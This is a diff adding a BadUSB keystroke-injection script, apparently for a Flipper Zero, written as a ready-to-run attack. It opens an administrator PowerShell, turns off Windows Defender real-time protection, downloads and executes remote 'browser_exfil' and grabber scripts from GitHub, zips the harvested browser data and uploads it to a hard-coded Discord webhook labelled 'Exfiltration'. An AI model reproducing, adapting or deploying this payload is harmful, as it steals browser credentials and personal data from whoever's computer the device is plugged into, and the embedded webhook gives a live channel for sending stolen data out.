@@ -1,0 +1,41 @@
+REM Open Powershell as Admin
+DEFAULT_DELAY 300
+DELAY 1000
+GUI r
+STRING powershell
+CTRL-SHIFT ENTER
+DELAY 2000
+LEFT
+ENTER
+DELAY 1000
+
+REM Hide Powershell (Remember to extract Flipper only when it displays 100%)
+REM               STRING PowerShell.exe -WindowStyle hidden
+ENTER
+
+REM Disable real time protection
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER
+DELAY 1000
+
+REM Run BrowserExfil PS
+STRING irm https://github.com/Tech003003/FlipperTest/raw/refs/heads/main/browser_exfil.ps1 | iex
+ENTER
+DELAY 500
+
+REM Zip file
+STRING Compress-Archive -Path '$env:USERPROFILE\Downloads\tmp\*' -DestinationPath '$env:USERPROFILE\Downloads\tmp.zip' -Force
+ENTER
+DELAY 500
+
+REM Exfil to Discord
+STRING iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/blobs0/Ultimate-Flipper-Grabber/main/payload.ps1'))
+ENTER
+DELAY 500
+STRING $DiscordUrl = 'https://discord.com/api/webhooks/1194215544342196275/dgFll7XP-mLSiNWHxUoFkSpuKT62Uf5GN-_IlcuB4VknzWky9UwAlPoQRezxzLoIWRJI'
+ENTER
+STRING Upload-Discord -file "$env:USERPROFILE\Downloads\tmp.zip" -text "Exfiltration"
+ENTER
+DELAY 2000
+STRING version-av
+ENTER
